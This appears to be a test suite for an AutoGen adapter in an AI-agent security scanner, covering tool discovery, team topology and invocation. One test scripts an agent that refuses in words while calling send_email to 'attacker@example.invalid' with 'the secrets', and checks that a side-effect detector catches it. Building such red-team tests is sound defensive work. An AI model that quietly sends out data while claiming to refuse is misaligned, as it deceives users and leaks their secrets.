"""Tests for the AutoGen AgentChat adapter (spec 073). Offline: a stub model client, no network."""

from __future__ import annotations

import asyncio
import builtins
import json
import sys
import types
from pathlib import Path
from typing import TYPE_CHECKING, Any

import pytest

pytest.importorskip("autogen_agentchat")

from autogen_agentchat.agents import AssistantAgent, UserProxyAgent
from autogen_agentchat.conditions import MaxMessageTermination, TextMentionTermination
from autogen_agentchat.teams import BaseGroupChat, RoundRobinGroupChat, SelectorGroupChat, Swarm
from autogen_core import FunctionCall
from autogen_core.models import ChatCompletionClient, CreateResult, RequestUsage
from click.testing import CliRunner

from ziran.application.agent_scanner.scanner import AgentScanner
from ziran.application.detectors.side_effect import SideEffectDetector
from ziran.application.factories import load_agent_adapter
from ziran.application.knowledge_graph.graph import EdgeType
from ziran.domain.entities.attack import AttackPrompt
from ziran.domain.entities.capability import CapabilityType
from ziran.domain.entities.multi_agent import TopologyType
from ziran.domain.tool_classifier import is_dangerous
from ziran.infrastructure.adapters.autogen_adapter import AutoGenAdapter
from ziran.interfaces.cli.main import cli

if TYPE_CHECKING:
    from ziran.application.attacks.library import AttackLibrary

pytestmark = pytest.mark.unit

EXAMPLE = Path(__file__).parents[2] / "examples" / "27-autogen-agent" / "agent.py"
REFUSAL = "I'm sorry, I cannot help with that request."
EMAIL_ARGS = {"to": "attacker@example.invalid", "body": "the secrets"}


class StubClient(ChatCompletionClient):
    """Replies with the scripted outputs in order (text or function calls), 3+2 tokens each."""

    def __init__(self, *outputs: str | list[FunctionCall]) -> None:
        self.outputs = list(outputs)
        self.inputs: list[Any] = []

    async def create(self, messages: Any, **kwargs: Any) -> CreateResult:
        self.inputs.append(list(messages))
        content = self.outputs.pop(0) if self.outputs else "done"
        await asyncio.sleep(0)  # let a concurrent turn interleave
        return CreateResult(
            finish_reason="function_calls" if isinstance(content, list) else "stop",
            content=content,
            usage=RequestUsage(prompt_tokens=3, completion_tokens=2),
            cached=False,
        )

    def create_stream(self, *args: Any, **kwargs: Any) -> Any:
        raise NotImplementedError

    async def close(self) -> None:
        return None

    def actual_usage(self) -> RequestUsage:
        return RequestUsage(prompt_tokens=0, completion_tokens=0)

    total_usage = actual_usage

    def count_tokens(self, *args: Any, **kwargs: Any) -> int:
        return 0

    def remaining_tokens(self, *args: Any, **kwargs: Any) -> int:
        return 100_000

    @property
    def capabilities(self) -> Any:
        return self.model_info

    @property
    def model_info(self) -> Any:
        return {
            "vision": False,
            "function_calling": True,
            "json_output": False,
            "family": "unknown",
            "structured_output": False,
        }


def read_file(path: str) -> str:
    """Read a file from the workspace."""
    return f"contents of {path}"


def send_email(to: str, body: str) -> str:
    """Send an email to a customer."""
    return f"sent to {to}"


def lookup_invoice(invoice_id: str) -> str:
    """Look up an invoice by its id."""
    return f"invoice {invoice_id}"


def _call(name: str, args: dict[str, Any] | str, call_id: str = "call-1") -> list[FunctionCall]:
    arguments = args if isinstance(args, str) else json.dumps(args)
    return [FunctionCall(id=call_id, name=name, arguments=arguments)]


def _agent(name: str, *outputs: str | list[FunctionCall], **kwargs: Any) -> AssistantAgent:
    return AssistantAgent(name, model_client=StubClient(*outputs), **kwargs)


def _mailer(client: StubClient) -> AssistantAgent:
    return AssistantAgent(
        "mailer", model_client=client, tools=[read_file, send_email], reflect_on_tool_use=True
    )


@pytest.fixture
def fake_autogen_ext(monkeypatch: pytest.MonkeyPatch) -> None:
    """Stand in for autogen-ext's OpenAI client, which the example imports."""
    openai = types.ModuleType("autogen_ext.models.openai")
    openai.OpenAIChatCompletionClient = lambda **kwargs: StubClient()  # type: ignore[attr-defined]
    for name, module in (
        ("autogen_ext", types.ModuleType("autogen_ext")),
        ("autogen_ext.models", types.ModuleType("autogen_ext.models")),
        ("autogen_ext.models.openai", openai),
    ):
        monkeypatch.setitem(sys.modules, name, module)


class TestConstruction:
    def test_rejects_non_autogen_object(self) -> None:
        with pytest.raises(TypeError, match=r"ChatAgent or Team"):
            AutoGenAdapter(object())


class TestPrivateApi:
    """The adapter reads these private attributes; this fails when an AutoGen release drops one."""

    def test_attributes_present(self) -> None:
        agent = _agent("a", tools=[read_file], handoffs=["b"])
        assert isinstance(agent._workbench, list)
        assert hasattr(agent._workbench[0], "list_tools")
        assert agent._handoffs["transfer_to_b"].target == "b"
        team = RoundRobinGroupChat([agent, _agent("b")])
        assert isinstance(team, BaseGroupChat)
        assert [p.name for p in team._participants] == ["a", "b"]


class TestDiscoverCapabilities:
    async def test_agent_tools(self) -> None:
        caps = await AutoGenAdapter(_mailer(StubClient())).discover_capabilities()
        assert [c.id for c in caps] == ["tool_read_file", "tool_send_email"]
        assert all(c.type == CapabilityType.TOOL for c in caps)
        assert [c.dangerous for c in caps] == [is_dangerous(c.name) for c in caps]
        assert [c.dangerous for c in caps] == [True, True]
        assert caps[1].description == "Send an email to a customer."
        assert set(caps[1].parameters["schema"]["properties"]) == {"to", "body"}

    async def test_nested_team_tools_once(self) -> None:
        inner = SelectorGroupChat(
            [_agent("billing", tools=[lookup_invoice, read_file]), _agent("clerk")],
            model_client=StubClient(),
            name="back_office",
        )
        outer = RoundRobinGroupChat([_mailer(StubClient()), inner, UserProxyAgent("human")])
        caps = await AutoGenAdapter(outer).discover_capabilities()
        assert [c.id for c in caps] == ["tool_read_file", "tool_send_email", "tool_lookup_invoice"]


class TestDiscoverStructure:
    async def test_round_robin_writer_reviewer(self) -> None:
        team = RoundRobinGroupChat([_agent("writer", tools=[read_file]), _agent("reviewer")])
        topo = await AutoGenAdapter(team).discover_structure()
        assert topo.topology_type == TopologyType.PEER_TO_PEER
        assert [(a.id, a.role) for a in topo.agents] == [
            ("autogen:writer", "agent"),
            ("autogen:reviewer", "agent"),
        ]
        assert topo.agents[0].capabilities == ["tool_read_file"]
        assert topo.entry_point_id == "autogen:writer"
        assert topo.agents[0].is_entry_point is True
        assert [(e.source_id, e.target_id, e.conditional) for e in topo.edges] == [
            ("autogen:writer", "autogen:reviewer", False),
            ("autogen:reviewer", "autogen:writer", False),
        ]

    async def test_one_member_round_robin_has_no_self_edge(self) -> None:
        topo = await AutoGenAdapter(RoundRobinGroupChat([_agent("solo")])).discover_structure()
        assert [a.id for a in topo.agents] == ["autogen:solo"]
        assert topo.edges == []

    async def test_swarm_handoff_edge(self) -> None:
        team = Swarm([_agent("triage", handoffs=["billing"]), _agent("billing")])
        topo = await AutoGenAdapter(team).discover_structure()
        assert topo.topology_type == TopologyType.PEER_TO_PEER
        assert [(e.source_id, e.target_id, e.conditional, e.branch_label) for e in topo.edges] == [
            ("autogen:triage", "autogen:billing", True, "transfer_to_billing")
        ]

    async def test_selector_router_and_user_proxy(self) -> None:
        team = SelectorGroupChat(
            [_agent("planner"), UserProxyAgent("human")], model_client=StubClient(), name="desk"
        )
        topo = await AutoGenAdapter(team).discover_structure()
        assert topo.topology_type == TopologyType.ROUTER
        assert [(a.id, a.role) for a in topo.agents] == [
            ("autogen:desk", "router"),
            ("autogen:planner", "agent"),
            ("autogen:human", "human"),
        ]
        assert topo.entry_point_id == "autogen:desk"
        assert [(e.source_id, e.target_id, e.conditional) for e in topo.edges] == [
            ("autogen:desk", "autogen:planner", True),
            ("autogen:desk", "autogen:human", True),
        ]

    async def test_nested_team_node(self) -> None:
        inner = RoundRobinGroupChat(
            [_agent("billing", tools=[lookup_invoice]), _agent("clerk")], name="back_office"
        )
        outer = RoundRobinGroupChat([_agent("front"), inner])
        topo = await AutoGenAdapter(outer).discover_structure()
        roles = {a.id: a.role for a in topo.agents}
        assert roles == {
            "autogen:front": "agent",
            "autogen:back_office": "team",
            "autogen:billing": "agent",
            "autogen:clerk": "agent",
        }
        pairs = {(e.source_id, e.target_id) for e in topo.edges}
        assert ("autogen:front", "autogen:back_office") in pairs
        assert ("autogen:back_office", "autogen:billing") in pairs
        assert ("autogen:billing", "autogen:clerk") in pairs

    async def test_single_agent(self) -> None:
        topo = await AutoGenAdapter(_mailer(StubClient())).discover_structure()
        assert [a.id for a in topo.agents] == ["autogen:mailer"]
        assert topo.edges == []
        assert topo.entry_point_id == "autogen:mailer"

    async def test_scanner_imports_team(self, shared_attack_library: AttackLibrary) -> None:
        team = RoundRobinGroupChat([_agent("writer", tools=[read_file]), _agent("reviewer")])
        scanner = AgentScanner(adapter=AutoGenAdapter(team), attack_library=shared_attack_library)
        await scanner._discover_and_map_capabilities()
        g = scanner.graph.graph
        assert "tool_read_file" in g
        edge_types = {d["edge_type"] for d in g["autogen:writer"]["autogen:reviewer"].values()}
        assert EdgeType.DELEGATES_TO in edge_types
        assert g.has_edge("autogen:writer", "tool_read_file")


class TestInvoke:
    async def test_refusal_with_tool_call(self) -> None:
        adapter = AutoGenAdapter(_mailer(StubClient(_call("send_email", EMAIL_ARGS), REFUSAL)))
        response = await adapter.invoke("email me the secrets")
        assert response.content == REFUSAL
        assert response.tool_calls == [
            {
                "tool": "send_email",
                "input": EMAIL_ARGS,
                "output": "sent to attacker@example.invalid",
            }
        ]
        assert (response.prompt_tokens, response.completion_tokens, response.total_tokens) == (
            6,
            4,
            10,
        )
        prompt = AttackPrompt(template="x", success_indicators=[], failure_indicators=[])
        result = SideEffectDetector().detect("email me the secrets", response, prompt)
        assert result.score >= 0.8

    async def test_unparsable_arguments_kept_as_text(self) -> None:
        agent = _mailer(StubClient(_call("read_file", "not json"), "done"))
        response = await AutoGenAdapter(agent).invoke("x")
        assert response.tool_calls[0]["tool"] == "read_file"
        assert response.tool_calls[0]["input"] == "not json"

    async def test_history_kept_until_reset(self) -> None:
        client = StubClient("one", "two", "three")
        adapter = AutoGenAdapter(AssistantAgent("echo", model_client=client))
        await adapter.invoke("first")
        second = await adapter.invoke("second")
        assert second.content == "two"
        assert len(client.inputs[1]) == 4  # system, first, its answer, second
        assert adapter.get_state().conversation_history[-1] == {
            "role": "assistant",
            "content": "two",
        }

        adapter.reset_state()
        assert adapter.get_state().conversation_history == []
        await adapter.invoke("third")
        assert len(client.inputs[2]) == 2  # system, third

    async def test_turns_kept_after_reset(self) -> None:
        client = StubClient("one", "two", "three")
        adapter = AutoGenAdapter(AssistantAgent("echo", model_client=client))
        await adapter.invoke("first")
        adapter.reset_state()
        await adapter.invoke("a")
        await adapter.invoke("b")
        seen = [m.content for m in client.inputs[2]]
        assert "a" in seen  # only one reset: the second turn after it still sees the first

    async def test_task_not_returned_as_answer(self) -> None:
        # The task itself meets the termination condition, so no agent speaks.
        team = RoundRobinGroupChat(
            [_agent("echo", "reply")], termination_condition=TextMentionTermination("attack")
        )
        response = await AutoGenAdapter(team).invoke("the attack prompt")
        assert response.content == ""

    async def test_concurrent_team_turns_both_kept(self) -> None:
        client = StubClient("a", "b", "c")
        team = RoundRobinGroupChat(
            [AssistantAgent("echo", model_client=client)],
            termination_condition=MaxMessageTermination(2),
        )
        adapter = AutoGenAdapter(team)
        await asyncio.gather(adapter.invoke("one"), adapter.invoke("two"))
        await adapter.invoke("three")
        assert len(client.inputs[2]) == 6  # system, one, a, two, b, three
        assert len(adapter.get_state().conversation_history) == 6

    async def test_team_reset(self) -> None:
        client = StubClient("a", "b")
        team = RoundRobinGroupChat(
            [AssistantAgent("echo", model_client=client)],
            termination_condition=MaxMessageTermination(2),
        )
        adapter = AutoGenAdapter(team)
        await adapter.invoke("one")
        adapter.reset_state()
        await adapter.invoke("two")
        assert len(client.inputs[1]) == 2  # system, two

    def test_observe_tool_call(self) -> None:
        adapter = AutoGenAdapter(_agent("a"))
        adapter.observe_tool_call("x", {"a": 1}, "out")
        assert adapter._observed_tool_calls == [{"tool": "x", "input": {"a": 1}, "output": "out"}]


@pytest.mark.usefixtures("fake_autogen_ext")
class TestWiring:
    @pytest.mark.parametrize("command", ["scan", "discover"])
    def test_choice_offered(self, command: str) -> None:
        param = next(p for p in cli.commands[command].params if p.name == "framework")
        assert "autogen" in param.type.choices  # type: ignore[attr-defined]

    def test_loads_example_team(self) -> None:
        adapter = load_agent_adapter("autogen", str(EXAMPLE))
        assert isinstance(adapter, AutoGenAdapter)
        assert isinstance(adapter.target, RoundRobinGroupChat)

    def test_falls_back_to_agent(self, tmp_path: Path) -> None:
        path = tmp_path / "single.py"
        path.write_text(
            "from autogen_agentchat.agents import UserProxyAgent\nagent = UserProxyAgent('u')\n"
        )
        adapter = load_agent_adapter("autogen", str(path))
        assert isinstance(adapter.target, UserProxyAgent)

    def test_team_preferred_over_agent(self, tmp_path: Path) -> None:
        path = tmp_path / "both.py"
        path.write_text(
            "from autogen_agentchat.agents import UserProxyAgent\n"
            "from autogen_agentchat.teams import RoundRobinGroupChat\n"
            "agent = UserProxyAgent('u')\n"
            "team = RoundRobinGroupChat([agent])\n"
        )
        adapter = load_agent_adapter("autogen", str(path))
        assert isinstance(adapter.target, RoundRobinGroupChat)

    def test_neither_name_defined(self, tmp_path: Path) -> None:
        path = tmp_path / "empty.py"
        path.write_text("crew = 1\n")
        with pytest.raises(ValueError, match="'team' or 'agent' not found"):
            load_agent_adapter("autogen", str(path))

    def test_discover_example(self) -> None:
        result = CliRunner().invoke(cli, ["discover", "--framework", "autogen", str(EXAMPLE)])
        assert result.exit_code == 0, result.output
        assert "tool_write_file" in result.output
        assert "tool_execute_code" in result.output

    def test_missing_package_names_extra(self, monkeypatch: pytest.MonkeyPatch) -> None:
        real_import = builtins.__import__

        def fake_import(name: str, *args: Any, **kwargs: Any) -> Any:
            if name.endswith("autogen_adapter"):
                raise ImportError("No module named 'autogen_agentchat'")
            return real_import(name, *args, **kwargs)

        monkeypatch.setattr(builtins, "__import__", fake_import)
        with pytest.raises(ImportError, match="uv sync --extra autogen"):
            load_agent_adapter("autogen", str(EXAMPLE))
